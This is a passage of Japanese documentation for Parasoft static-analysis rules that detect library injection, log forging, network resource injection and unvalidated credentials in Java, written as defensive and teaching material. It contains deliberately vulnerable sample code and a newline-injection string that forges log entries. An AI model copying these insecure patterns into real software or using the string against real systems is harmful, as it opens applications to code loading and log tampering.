PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/2bcd9f58-0c8a-4565-b393-104d2821e6b7">https://app.hackedu.com/link/2bcd9f58-0c8a-4565-b393-104d2821e6b7</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/90.html">https://cwe.mitre.org/data/definitions/90.html</A>

Understanding LDAP:
<A target="_blank" HREF="https://www.redbooks.ibm.com/redbooks/pdfs/sg244986.pdf">https://www.redbooks.ibm.com/redbooks/pdfs/sg244986.pdf</A>

Introduction to LDAP Security:
<A target="_blank" HREF="http://www.severus.org/sacha/docperso/intro_to_ldap_tisc.htm">http://www.severus.org/sacha/docperso/intro_to_ldap_tisc.htm</A>

Web Application Security Consortium:
<A target="_blank" HREF="http://www.webappsec.org/projects/threat/classes/ldap_injection.shtml">http://www.webappsec.org/projects/threat/classes/ldap_injection.shtml</A>

RFC 1960 - A String Representation of LDAP Search Filters:
<A target="_blank" HREF="http://www.ietf.org/rfc/rfc1960.txt">http://www.ietf.org/rfc/rfc1960.txt</A>

OWASP Code Review Guide 2008 V1.1
Reviewing by technical control: Authentication p. 66
Reviewing Code for Cross-site scripting p. 141

Tags: OWASP, PCI-DSS, CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDLIB" href="#top">[Top]</a><br/><br/><STRONG>
ライブラリ インジェクションから防御する [BD.SECURITY.TDLIB]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
エンド ユーザーから直接渡されるデータを使って、
ロードされるライブラリの名前を生成している場合、
このルールは違反をレポートします。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。


java.lang.System
   * void load(String)
   * void loadLibrary(String)

java.lang.Runtime
   * void load(String)
   * void loadLibrary(String)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

ユーザ入力を検証せずにライブラリ名を生成してロードした場合、
悪意のあるプログラマによる
不正なコードが実行されてシステムに被害を与える可能性があります。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
「セキュリティとの関連」セクションを参照してください。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
通常、ライブラリをロードするメソッドでユーザー データを直接使用するケースを
目にすることはまずないでしょう。
しかし、ユーザー データを使ってどのライブラリのロードが必要かを判断したり、
ユーザー データをライブラリ名やパスの一部として使用したりするケースは
十分ありえます。

次のサンプル コードは、ユーザー データを厳密にはライブラリ名では
使用していません。しかし、sLibraryName を汚染されたデータと
見なす理由は、ここでどのような処理が行われるかが不明であること、そして
ユーザー データの一部をライブラリ名で使用でき、これはシステムの危険な操作に
つながる恐れがあることです。

import javax.servlet.http.HttpServletRequest;

public abstract class Example
{
    void example(HttpServletRequest req)
        throws Exception
    {
        String sParams = req.getParameter("user_parameters");
        String sLibraryName = getLibraryNameToLoad(sParams);
        System.loadLibrary(sLibraryName); // 違反
    }

    public abstract String getLibraryNameToLoad(String params);
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用前にデータを検証します。

import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{
    void example(HttpServletRequest req)
        throws Exception
    {
        String sParams = validate(req.getParameter("user_parameters"));
        String sLibraryName = getLibraryNameToLoad(sParams);
        System.loadLibrary(sLibraryName); // 違反ではない
    }

    public abstract String getLibraryNameToLoad(String params);

    public abstract String validate(Object obj);
}


教育とトレーニング

Code Injections
Video: <A target="_blank" HREF="https://vimeo.com/304405723">https://vimeo.com/304405723</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_3-Code-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_3-Code-Injections.pdf</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

CWE-114: Process Control
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/114.html">https://cwe.mitre.org/data/definitions/114.html</A>

CWE-829: Inclusion of Functionality from Untrusted Control Sphere
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/829.html">https://cwe.mitre.org/data/definitions/829.html</A>

SEI CERT Oracle Coding Standard for Java
JNI01-J. Safely invoke standard APIs that perform tasks using the immediate caller's class loader instance (loadLibrary)
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88487334">https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88487334</A>

OWASP Code Review Guide 2008 V1.1
Reviewing by technical control: Input Validation p. 81
Reviewing Code for Cross-site scripting p. 141

Tags: CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDLOG" href="#top">[Top]</a><br/><br/><STRONG>
ログ偽造から防御する [BD.SECURITY.TDLOG]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、汚染されたデータがログに書き込まれるログ偽造を
検出します。

アプリケーションのタイプによっては、ログが目視で確認されたり、
自動的に重要なイベントやトレンド情報を収集するツールによって
確認される場合があります。汚染されたデータが適切な検証を経ることなく
ログに書き込まれると、ログのフォーマットが変更され、自動化された
ログ パーサーの処理が失敗したり、攻撃者の痕跡が隠されたりする可能性が
あります。

このルールは、以下のログ API をサポートしています。
   * log4j (<A target="_blank" HREF="http://logging.apache.org/log4j/)">http://logging.apache.org/log4j/)</A>
   * logback (<A target="_blank" HREF="http://logback.qos.ch/)">http://logback.qos.ch/)</A>
   * SLF4J (<A target="_blank" HREF="http://www.slf4j.org/)">http://www.slf4j.org/)</A>
   * java.util.logging (<A target="_blank" HREF="https://docs.oracle.com/javase/7/docs/api/java/util/logging/package-summary.html)">https://docs.oracle.com/javase/7/docs/api/java/util/logging/package-summary.html)</A>
   * Commons Logging (<A target="_blank" HREF="http://commons.apache.org/logging/)">http://commons.apache.org/logging/)</A>



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v9.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

汚染されたユーザー データがログに書き込まれると、攻撃者はログ エントリを偽造したり、
悪意のあるコンテンツをログに注入したりできます。


このルールを推進すると、OWASP の 2013 年 アプリケーション脆弱性トップ 10「A1 - 
インジェクション」を防ぐのに役立ちます。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト


[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
攻撃者がログ エントリを偽造したり、悪意のあるコンテンツをログに注入したりするのを防ぎます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

このサンプルでは、ユーザーが入力したデータを使って訪問者をログ記録しています。
攻撃者は、文字列 "Attacker%0a%0aINFO:+Your+log+is+forged" を渡すことで、ログを偽造できます。

import java.util.logging.Logger;
import javax.servlet.http.HttpServletRequest;

public class Example
{
    private final static Logger _log = Logger.getLogger(Example.class.getName());

    public void printUser(HttpServletRequest request)
    {
        String user = request.getParameter("user");
        _log.warning("User visited: " + user); // 違反
    }
}
	
結果は次のとおりです。
WARNING: User visited: Attacker

INFO: Your log is forged

攻撃者は同様のアプローチを用いて任意のログ エントリを挿入できます。
	

</PRE>
<STRONG>
修正
</STRONG>
<PRE>
データを使用する前に検証します。

import java.util.logging.Logger;
import javax.servlet.http.HttpServletRequest;

public class Repair
{
    private final static Logger _log = Logger.getLogger(Repair.class.getName());

    public void printUser(HttpServletRequest request)
    {
        String user = validate(request.getParameter("user"));
        _log.warning("User visited: " + user); // 違反ではない
    }

    public static String validate(Object obj)
    {
        // some data verification
    }
}


教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/05545df0-ded8-442a-a50b-8e0038e97538">https://app.hackedu.com/link/05545df0-ded8-442a-a50b-8e0038e97538</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

CWE-117: Improper Output Neutralization for Logs
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/117.html">https://cwe.mitre.org/data/definitions/117.html</A>

SEI CERT Oracle Coding Standard for Java
IDS03-J. Do not log unsanitized user input
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/IDS03-J.+Do+not+log+unsanitized+user+input">https://wiki.sei.cmu.edu/confluence/display/java/IDS03-J.+Do+not+log+unsanitized+user+input</A>

OWASP Code Review Guide 2008 V1.1
Reviewing Code for Logging Issues p. 153

Tags: OWASP, PCI-DSS, CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDNET" href="#top">[Top]</a><br/><br/><STRONG>
ネットワーク リソース インジェクションから防御する [BD.SECURITY.TDNET]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、ネットワーク リソース インジェクションの可能性がある場合に
違反をレポートします。汚染されている可能性のあるデータが、ホスト名、
IP アドレス、ポート番号、パス、クエリー文字列などのネットワーク リソースを
表すパラメーターとしてメソッドに渡され、メソッドが直接リソースを割り当てたり、
リソースの割り当てに使用される URL や URI などのリソース記述子を作成したり
する可能性がある場合に、違反をレポートします。

ユーザの入力や未検証のデータ ソースからの入力を使用してリソースを定義しており、
使用の前に入力を検証していない場合、別のリソースを実行したりアクセスしたり
するよう操作される可能性があります。

このルールは、汚染されたデータが以下の「危険な」メソッドに渡されている場合、
違反をレポートします。

java.net.DatagramPacket
   * setPort(int port)
   * ポート番号を受け取るコンストラクター

java.net.DatagramSocket
   * connect(InetAddress address, int port)
   * ポート番号を受け取るコンストラクター

java.net.DatagramSocketImpl
   * connect(InetAddress address, int port)
   * bind(int port, InetAddress addr)

java.net.InetSocketAddress
   * createUnresolved(String host, int port)
   * ポート番号を受け取るコンストラクター

java.net.MulticastSocket
   * ポート番号を受け取るコンストラクター

java.net.ServerSocket
   * ポート番号を受け取るコンストラクター

java.net.Socket
   * ポート番号を受け取るコンストラクター

java.net.SocketImpl
   * connect(String host, int port)
   * connect(InetAddress address, int port)
   * bind(InetAddress host, int port)

java.net.URI
   * resolve(String str)
   * create(String str)
   * ポート番号を受け取るコンストラクター

java.net.URL
   * ポート番号を受け取るコンストラクター

java.net.URLStreamHandler
   * setURL(URL u, String protocol, String host, int port, String authority,
            String userInfo, String path, String query, String ref)
   * parseURL(URL u, String spec, int start, int limit)

java.net.InetAddress
   * getAllByName(String host)
   * getByAddress(String host, byte[] addr)
   * getByAddress(byte[] addr)
   * getByName(String host)

java.net.NetworkInterface
   * getByName(String name)

java.rmi.activation.Activatable
   * ポート番号を受け取るすべての exportObject(...) メソッド
   * ポート番号を受け取るコンストラクター

java.rmi.registry.LocateRegistry
   * ポート番号を受け取るすべての getRegistry(...) メソッド
   * ポート番号を受け取るすべての createRegistry(...) メソッド

java.rmi.server.RMIClientSocketFactory
   * createSocket(String host, int port)

java.rmi.server.RMIServerSocketFactory
   * createServerSocket(int port)

java.util.logging.SocketHandler
   * ポート番号を受け取るコンストラクター

javax.net.ServerSocketFactory
   * ポート番号を受け取るすべての createServerSocket(...) メソッド

javax.net.SocketFactory
   * ポート番号を受け取るすべての createSocket(...) メソッド

javax.net.ssl.SSLSocket
   * ポート番号を受け取るコンストラクター

javax.net.ssl.SSLServerSocket
   * ポート番号を受け取るコンストラクター



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

未検証のリソース プロパティが使用されている場合、攻撃者はアプリケーションが実行
されているシステムのリソースに直接アクセスしたり (サンプルコードを参照)、
アプリケーションに他のリモート リソースを実行させたりすることができます。
つまり、開発者の意図しない方法でアプリケーションの振る舞いを変更することが
できます。

このルールを推進すると、OWASP の 2017 年 アプリケーション脆弱性トップ 10「A1 - 
インジェクション」を防ぐのに役立ちます。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
ネットワーク リソース識別子を変更する攻撃にアプリケーションが
耐えられることを保障するのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
次のサンプルは、HTTP リクエストから取得したポート番号を検証せずに使用して、
サーバ ソケットを作成しています。プロキシを使用するユーザーは、ポートを
変更してサーバへの直接的なソケット接続を獲得することができます。

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import javax.servlet.http.HttpServletRequest;

public class Example
{
    void runServerSocket(HttpServletRequest request)
        throws IOException
    {
        String sPort = request.getParameter("port");
        int port = Integer.parseInt(sPort);
        ServerSocket serverSocket = new ServerSocket(port); // 違反
        Socket socket = serverSocket.accept();
        // ...
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
データを検証してから使用します。

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{
    void runServerSocket(HttpServletRequest request)
        throws IOException
    {
        String sPort = validate(request.getParameter("port"));
        int port = Integer.parseInt(sPort);
        ServerSocket serverSocket = new ServerSocket(port); // 違反ではない
        Socket socket = serverSocket.accept();
        // ...
    }

    public abstract String validate(Object obj);
}


教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/05d42613-615c-4da5-8860-02c827e2cd02">https://app.hackedu.com/link/05d42613-615c-4da5-8860-02c827e2cd02</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Weaknesses On the Cusp
CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/601.html">https://cwe.mitre.org/data/definitions/601.html</A>

2020 CWE Weaknesses On the Cusp
CWE-918: Server-Side Request Forgery (SSRF)
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/918.html">https://cwe.mitre.org/data/definitions/918.html</A>

CWE-99: Improper Control of Resource Identifiers ('Resource Injection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/99.html">https://cwe.mitre.org/data/definitions/99.html</A>

OWASP Injection Flaws:
<A target="_blank" HREF="https://www.owasp.org/index.php/Injection_Flaws">https://www.owasp.org/index.php/Injection_Flaws</A>

OWASP Resource Injection:
<A target="_blank" HREF="https://www.owasp.org/index.php/Resource_Injection">https://www.owasp.org/index.php/Resource_Injection</A>

Tags: OWASP, PCI-DSS, CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDPASSWD" href="#top">[Top]</a><br/><br/><STRONG>
保護されていない認証情報の使用から保護する [BD.SECURITY.TDPASSWD]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、汚染されたデータが認証情報として使用されている場合に
違反をレポートします。
汚染されている可能性があるデータを検証せずに以下のメソッドに渡している
場合、違反をレポートします。

   java.sql.DriverManager
      * getConnection(String, String, String)

   org.apache.http.auth.NTCredentials
      * NTCredentials(String, String, String, String) 

   java.net.PasswordAuthentication
      * PasswordAuthentication(String, char[]) 

ルールをパラメータライズし、汚染されているとみなすデータ ソースと、
検証メソッドとして許可するメソッドを指定する必要があります (「パラメーター」
を参照)。



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>

v10.4.2



</PRE>
<STRONG>
注意
</STRONG>
<PRE>

N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

汚染されたデータを認証情報として使用すると、攻撃者が保護されたリソースに対して
認可されていないアクセス権を取得する可能性があります。

「パスワードがアプリケーションのプロパティや設定ファイルにプレーンテキストとして
保存されている場合、パスワード管理の問題が発生します。設定ファイルにプレーンテキスト
のパスワードを保存すると、ファイルを読むことができる誰でもパスワードで保護された
リソースにアクセスできてしまうことになります。」[CWE-256] 



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。



</PRE>
<STRONG>
利点
</STRONG>
<PRE>

